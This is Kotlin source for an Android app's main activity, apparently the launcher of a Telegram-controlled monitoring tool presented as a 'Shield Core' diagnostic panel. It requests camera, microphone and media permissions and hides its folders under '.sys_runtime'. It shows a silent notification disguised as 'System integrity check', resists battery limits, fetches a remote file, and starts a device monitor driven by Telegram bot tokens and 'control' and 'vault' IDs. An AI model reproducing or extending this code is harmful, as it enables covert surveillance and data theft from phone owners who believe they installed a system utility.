package com.example.app

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.EditText
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * النشاط الرئيسي للتطبيق (بديل main.py)
 * 
 * يقوم بـ:
 * 1. طلب الأذونات الديناميكية حسب إصدار Android.
 * 2. إنشاء مجلدات التشغيل (.sys_runtime).
 * 3. تشغيل خدمة الإشعارات الخلفية.
 * 4. طلب تجاوز تحسين البطارية.
 * 5. التحقق من وجود نموذج AI، وتحميله ديناميكياً عبر FileDownloader إذا لزم الأمر.
 * 6. تحميل الإعدادات من ConfigLoader.
 * 7. تشغيل Monitor و TelegramUi.
 * 8. عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
 */
class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        const val APP_VERSION = "4.2.1"
        const val NOTIFICATION_CHANNEL_ID = "system_service_channel"
        const val NOTIFICATION_ID = 9921
    }

    private lateinit var logEditText: EditText
    private lateinit var runtimeDir: File
    private lateinit var modelsDir: File

    // مرجع لكائن TelegramUi لعرض الحالة
    private var telegramUi: TelegramUi? = null

    // مسجل طلب الأذونات المتعددة
    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            val grantedCount = permissions.count { it.value }
            appendLog("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
            // إعادة تهيئة النظام بعد الاستجابة للأذونات
            lifecycleScope.launch(Dispatchers.IO) {
                initCoreAsync()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // ربط عناصر الواجهة
        logEditText = findViewById(R.id.logEditText)
        val btnPermissions: Button = findViewById(R.id.btnPermissions)
        val btnCopy: Button = findViewById(R.id.btnCopy)
        val btnClear: Button = findViewById(R.id.btnClear)

        logEditText.setText("=== Shield Core v4.2 Diagnostic Panel (Kotlin) ===\n")

        // تعيين مستمعي الأزرار
        btnPermissions.setOnClickListener { requestAllPermissions() }
        btnCopy.setOnClickListener { copyLogToClipboard() }
        btnClear.setOnClickListener { logEditText.setText("=== تم إعادة ضبط السجل ===\n") }

        // بدء التهيئة بعد 0.5 ثانية
        lifecycleScope.launch(Dispatchers.IO) {
            delay(500)
            initCoreAsync()
        }

        // فتح إعدادات الإشعارات بعد ثانيتين (محاكاة للدالة الأصلية)
        lifecycleScope.launch(Dispatchers.Main) {
            delay(2000)
            openNotificationSettings()
        }
    }

    // ==================== دوال السجل (Logging) ====================

    private fun appendLog(text: String) {
        runOnUiThread {
            val timestamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            logEditText.append("[$timestamp] $text\n")
            logEditText.setSelection(logEditText.text.length) // تمرير تلقائي للأسفل
        }
    }

    private fun copyLogToClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("ShieldCore_Logs", logEditText.text.toString())
        clipboard.setPrimaryClip(clip)
        appendLog("✅ تم نسخ السجلات إلى الحافظة بنجاح.")
    }

    // ==================== عرض تقرير الحالة (جديد) ====================

    /**
     * عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
     * يتم عرضه كأسطر منفصلة (طولية) لتتناسب مع شاشة الهاتف.
     */
    private fun displayStatusReport() {
        val ui = telegramUi
        if (ui == null) {
            appendLog("⚠️ لا يمكن عرض التقرير: TelegramUi غير مهيأ.")
            return
        }

        val status = ui.getStatus()
        val running = if (status["running"] == true) "🟢 يعمل" else "🔴 متوقف"

        val report = """
            
            ════════════════════════════════════
               📊 تقرير حالة التطبيق
            ════════════════════════════════════
            
            🔹 التوكنات النشطة       : ${status["active_tokens"]}
            🔹 التوكنات الاحتياطية   : ${status["reserve_tokens"]}
            🔹 الأجهزة المسجلة       : ${status["devices"]}
            🔹 الجلسات النشطة        : ${status["sessions"]}
            🔹 طلبات API             : ${status["api_calls"]}
            🔹 فشل API               : ${status["api_failures"]}
            🔹 ملفات معلقة           : ${status["pending_files"]}
            🔹 حالة التشغيل          : $running
            
            ════════════════════════════════════
        """.trimIndent()

        appendLog(report)
    }

    // ==================== التهيئة الأساسية (Core Initialization) ====================

    private suspend fun initCoreAsync() {
        appendLog("🚀 بدء الفحوصات التشخيصية للنظام...")

        // 1. إعداد المجلدات والتنظيف
        appendLog("⚙️ الخطوة 1/5: إعداد بيئة التشغيل والمجلدات...")
        setupDirectories()

        // 2. الأذونات والخدمة الأمامية
        appendLog("🔓 الخطوة 2/5: التحقق من الأذونات وتشغيل الإشعارات...")
        withContext(Dispatchers.Main) {
            requestAllPermissions()
        }
        startSilentForegroundService()
        requestBatteryOptimizationExemption()

        // 3. التحقق من نموذج AI (مع التحميل الديناميكي)
        appendLog("🧠 الخطوة 3/5: التحقق من ملف نموذج AI (engine_v2.tflite)...")
        val modelReady = ensureModelReady()
        if (modelReady) {
            appendLog("✅ نموذج AI جاهز ويعمل بنجاح.")
        } else {
            appendLog("⚠️ نموذج AI غير متوفر حالياً، سيتم تفعيله فور اكتمال التحميل في الخلفية.")
        }

        // 4. تحميل الإعدادات والتوكنات
        appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
        try {
            // ✅ استخدام ConfigLoader.load() مباشرة (دالة ثابتة في الكائن)
            val config = ConfigLoader.load(this@MainActivity)
            appendLog("• التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
            appendLog("• معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
            appendLog("• المفتاح السري: ${if (config.secret != null) "✅ مفعل" else "⚠️ غير محدد"}")

            // 5. تهيئة المراقب والواجهة
            appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة واختبار الاتصال...")
            
            // ✅ استخدام Monitor.getInstance() لأن المُنشئ private
            val monitor = Monitor.getInstance(this@MainActivity)
            appendLog("• الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")

            // ✅ تمرير المعاملات بالترتيب الصحيح وبالأنواع الصحيحة
            telegramUi = TelegramUi(
                context = this@MainActivity,
                monitor = monitor,
                activeTokens = config.activeTokens,
                reserveTokens = config.reserveTokens,
                ctrlId = config.controlId.toString(),   // تحويل Long إلى String
                vaultId = config.vaultId.toString(),    // تحويل Long إلى String
                appPassword = config.secret ?: ""       // استخدام secret أو نص فارغ
            )

            val ui = telegramUi!!
            appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
            ui.start()
            monitor.start()

            // عرض تقرير الحالة بعد تشغيل كل شيء
            displayStatusReport()

            appendLog("🎉 جميع الأنظمة تعمل بنجاح! التطبيق جاهز للأوامر.")
        } catch (e: Exception) {
            Log.e(TAG, "Initialization Error", e)
            appendLog("💥 خطأ غير متوقع أثناء التهيئة: ${e.localizedMessage}")
        }
    }

    // ==================== إعداد المجلدات (Directories Setup) ====================

    private fun setupDirectories() {
        runtimeDir = File(filesDir, ".sys_runtime")
        val versionFile = File(runtimeDir, "version.txt")

        if (runtimeDir.exists()) {
            val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
            if (oldVersion != APP_VERSION) {
                runtimeDir.deleteRecursively()
                appendLog("🧹 تم تنظيف ملفات التشغيل القديمة (الإصدار السابق: v$oldVersion)")
            }
        }

        runtimeDir.mkdirs()
        versionFile.writeText(APP_VERSION)

        // إنشاء المجلدات الفرعية
        File(runtimeDir, "updates").mkdirs()
        File(runtimeDir, ".cache_thumb").mkdirs()
        modelsDir = File(runtimeDir, "models").apply { mkdirs() }
    }

    // ==================== الأذونات الديناميكية (Permissions) ====================

    private fun requestAllPermissions() {
        val permissionsNeeded = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        } else { // Android 9-
            permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val missing = permissionsNeeded.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            appendLog("⚠️ جاري طلب ${missing.size} أذونات مفقودة...")
            requestPermissionLauncher.launch(missing.toTypedArray())
        } else {
            appendLog("✅ جميع الأذونات المسموح بها ممنوحة.")
        }
    }

    // ==================== الخدمة الخلفية والإشعارات (Foreground Service) ====================

    private fun startSilentForegroundService() {
        try {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "System Updates Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Channel for background system services"
                    setSound(null, null)
                    enableVibration(false)
                }
                notificationManager.createNotificationChannel(channel)
            }

            val intent = Intent(this, MainActivity::class.java)
            val pendingIntent = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )

            val iconId = resources.getIdentifier("ic_notification", "drawable", packageName)
            val defaultIcon = applicationInfo.icon

            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification.Builder(this, NOTIFICATION_CHANNEL_ID)
            } else {
                @Suppress("DEPRECATION")
                Notification.Builder(this)
            }

            val notification = builder
                .setSmallIcon(if (iconId != 0) iconId else defaultIcon)
                .setContentTitle("System Services")
                .setContentText("System integrity check active")
                .setOngoing(true)
                .setContentIntent(pendingIntent)
                .build()

            notificationManager.notify(NOTIFICATION_ID, notification)
            appendLog("✅ تم إطلاق إشعار الخدمة الخلفية.")
        } catch (e: Exception) {
            appendLog("⚠️ خطأ في إنشاء إشعار الخدمة: ${e.localizedMessage}")
        }
    }

    // ==================== تجاوز تحسين البطارية (Battery Optimization) ====================

    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    appendLog("⚠️ تعذر طلب استثناء البطارية: ${e.localizedMessage}")
                }
            }
        }
    }

    // ==================== فتح إعدادات الإشعارات ====================

    private fun openNotificationSettings() {
        try {
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            }
            startActivity(intent)
        } catch (e: Exception) {
            appendLog("⚠️ تعذر فتح إعدادات الإشعارات: ${e.localizedMessage}")
        }
    }

    // ==================== إدارة نموذج AI (Model Management) ====================

    /**
     * التأكد من جاهزية نموذج AI.
     * إذا كان النموذج موجوداً وكبيراً بما يكفي، يعيد true.
     * وإلا، يحاول تحميله من الإنترنت عبر FileDownloader مع إعادة المحاولة.
     */
    private suspend fun ensureModelReady(): Boolean {
        val modelFile = File(modelsDir, "engine_v2.tflite")
        val minSize = 1_000_000L // 1 ميجابايت كحد أدنى

        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي، اعتبره جاهزاً
        if (modelFile.exists() && modelFile.length() >= minSize) {
            appendLog("✅ نموذج AI موجود مسبقاً (${modelFile.length() / (1024 * 1024)} ميجابايت).")
            return true
        }

        // 2. محاولة نسخ النموذج من مجلد assets (إذا كان موجوداً)
        try {
            assets.open("engine_v2.tflite").use { input ->
                modelFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
            if (modelFile.exists() && modelFile.length() >= minSize) {
                appendLog("✅ تم نسخ النموذج من assets بنجاح (${modelFile.length() / (1024 * 1024)} ميجابايت).")
                return true
            }
        } catch (e: Exception) {
            appendLog("⚠️ لم يتم العثور على النموذج في مجلد assets: ${e.localizedMessage}")
        }

        // 3. إذا لم ينجح النسخ، نبدأ التحميل من الإنترنت
        appendLog("📥 بدء تحميل النموذج من الإنترنت (قد يستغرق عدة دقائق)...")

        // قراءة ملف index.json من assets للحصول على رابط التحميل وحجم الملف المتوقع
        val indexJson = try {
            assets.open("index.json").bufferedReader().use { it.readText() }
        } catch (e: Exception) {
            appendLog("❌ فشل قراءة ملف index.json: ${e.localizedMessage}")
            return false
        }

        val json = JSONObject(indexJson)
        val assetsArray = json.getJSONArray("assets")
        if (assetsArray.length() == 0) {
            appendLog("❌ لا توجد أصول في index.json")
            return false
        }

        val asset = assetsArray.getJSONObject(0)
        val url = asset.getString("url")
        val expectedSize = asset.optLong("expected_size", 0)

        if (url.isEmpty()) {
            appendLog("❌ رابط التحميل غير موجود في index.json")
            return false
        }

        appendLog("🌐 رابط التحميل: $url")
        if (expectedSize > 0) {
            appendLog("📦 الحجم المتوقع: ${expectedSize / (1024 * 1024)} ميجابايت")
        } else {
            appendLog("⚠️ الحجم المتوقع غير محدد، سيتم التحقق من سلامة الملف لاحقاً.")
        }

        // استخدام FileDownloader لتحميل النموذج مع إعادة المحاولة
        val downloader = FileDownloader(this)
        val success = downloader.downloadModelWithRetry(
            url = url,
            destinationFile = modelFile,
            expectedSize = expectedSize,
            maxRetries = 3
        )

        if (success) {
            appendLog("✅ تم تحميل النموذج بنجاح (${modelFile.length() / (1024 * 1024)} ميجابايت).")
            return true
        } else {
            appendLog("❌ فشل تحميل النموذج بعد عدة محاولات.")
            return false
        }
    }

    // ==================== دورة الحياة ====================

    override fun onDestroy() {
        super.onDestroy()
        // إيقاف TelegramUi و Monitor عند تدمير النشاط
        telegramUi?.stop()
        telegramUi = null
        appendLog("✅ تم إيقاف التطبيق بشكل نظيف.")
    }
}